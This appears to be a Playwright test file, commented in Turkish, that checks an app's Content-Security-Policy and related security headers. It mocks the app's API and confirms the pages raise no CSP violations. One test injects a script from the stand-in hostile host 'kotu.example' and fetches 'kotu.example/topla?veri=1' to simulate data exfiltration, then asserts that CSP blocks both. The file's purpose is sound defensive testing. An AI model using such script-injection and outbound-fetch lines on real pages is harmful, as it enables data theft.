import { expect, test, type Page } from "@playwright/test";

/**
 * SEC-10: web güvenlik başlıkları. Uygulamanın kendi işleyişi CSP ihlali
 * üretmez (Next betikleri, tema betiği, e-Belge önizlemesindeki satır içi
 * karekod betiği, e-postadaki uzak görsel); dış betik ve dışarıya istek engellenir.
 */
async function ihlalleriTopla(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}${e.blockedURI === "eval" ? ` @ ${e.sourceFile}:${e.lineNumber}:${e.columnNumber}` : ""}`));
  });
}
const ihlaller = (page: Page) => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

async function apiTaklidi(page: Page) {
  await page.addInitScript(() => sessionStorage.setItem("tekir_access", "e2e-token"));
  await page.route("**/api/v1/**", async (route) => {
    const yol = new URL(route.request().url()).pathname;
    let json: unknown = [];
    if (yol.endsWith("/auth/ben")) json = { userId: "u1", tenantId: "t1", rol: "yonetici" };
    else if (yol.endsWith("/eposta/gelen")) json = { toplam: 1, sayfa: 1, adet: 20, sayfaSayisi: 1, satirlar: [eposta] };
    else if (yol.endsWith("/eposta/gelen/e1")) json = eposta;
    else if (yol.endsWith("/ebelge/uygulamalar")) json = { efatura: { acik: false }, earsiv: { acik: false }, eirsaliye: { acik: false } };
    await route.fulfill({ json });
  });
  // E-postadaki uzak görsel: ağa çıkmadan küçük bir PNG döner.
  await page.route("https://gorsel.ornek.com/**", (route) => route.fulfill({ contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=", "base64") }));
}

const eposta = {
  id: "e1", mesajId: "<m1@ornek.com>", gonderenAdi: "Müşteri", gonderenEposta: "a@ornek.com", aliciEposta: "satis@tekir.com",
  konu: "Teklif", icerikMetin: "Merhaba", icerikHtml: `<p>Merhaba</p><img id="logo" src="https://gorsel.ornek.com/logo.png" alt="logo">`,
  tarih: "2026-11-01T10:00:00Z", okundu: true, durum: "yeni", cariId: null, crmFirsatId: null, faturaId: null, cari: null, ekler: [], teklifIslemi: null, teklifBelge: null,
};

test("güvenlik başlıkları her sayfada; giriş sayfası ihlalsiz", async ({ page }) => {
  await ihlalleriTopla(page);
  const yanit = await page.goto("/giris");
  const b = yanit!.headers();
  expect(b["content-security-policy"]).toContain("object-src 'none'");
  expect(b["content-security-policy"]).toContain("frame-ancestors 'self'");
  expect(b["x-frame-options"]).toBe("SAMEORIGIN");
  expect(b["x-content-type-options"]).toBe("nosniff");
  expect(b["x-powered-by"]).toBeUndefined();
  await expect(page.getByRole("button", { name: /Giriş/ }).first()).toBeVisible();
  expect(await ihlaller(page)).toEqual([]);
});

test("panel ve gelen e-posta (uzak görsel) ihlalsiz çalışır", async ({ page }) => {
  await ihlalleriTopla(page);
  await apiTaklidi(page);
  await page.goto("/panel/eposta?id=e1");
  const govde = page.locator(".email-body-content");
  await expect(govde.getByText("Merhaba")).toBeVisible();
  await expect.poll(() => govde.locator("#logo").evaluate((g: HTMLImageElement) => g.naturalWidth)).toBe(1);
  expect(await ihlaller(page)).toEqual([]);
});

test("e-Belge önizlemesi gibi srcDoc iframe'inde satır içi betik çalışır; dış betik ve dışarıya istek engellenir", async ({ page }) => {
  await ihlalleriTopla(page);
  await apiTaklidi(page);
  await page.goto("/panel/eposta?id=e1");
  await expect(page.locator(".email-body-content").getByText("Merhaba")).toBeVisible();
  const sonuc = await page.evaluate(async () => {
    const iframe = document.createElement("iframe");
    iframe.setAttribute("sandbox", "allow-scripts");
    iframe.srcdoc = `<div id="k"></div><script>document.getElementById("k").textContent = "karekod"; parent.postMessage("karekod-cizildi", "*");</script>`;
    const mesaj = new Promise<string>((ok) => window.addEventListener("message", (e) => ok(String(e.data)), { once: true }));
    document.body.appendChild(iframe);
    const onizleme = await Promise.race([mesaj, new Promise<string>((ok) => setTimeout(() => ok("zaman asimi"), 3000))]);
    const disBetik = await new Promise<string>((ok) => { const s = document.createElement("script"); s.src = "https://kotu.example/x.js"; s.onload = () => ok("yuklendi"); s.onerror = () => ok("engellendi"); document.head.appendChild(s); });
    const disIstek = await fetch("https://kotu.example/topla?veri=1").then(() => "gitti", () => "engellendi");
    return { onizleme, disBetik, disIstek };
  });
  expect(sonuc).toEqual({ onizleme: "karekod-cizildi", disBetik: "engellendi", disIstek: "engellendi" });
  const kayit = await ihlaller(page);
  expect(kayit.some((i) => i.startsWith("script-src") && i.includes("kotu.example"))).toBe(true);
  expect(kayit.some((i) => i.startsWith("connect-src") && i.includes("kotu.example"))).toBe(true);
  expect(kayit.filter((i) => !i.includes("kotu.example"))).toEqual([]);
});
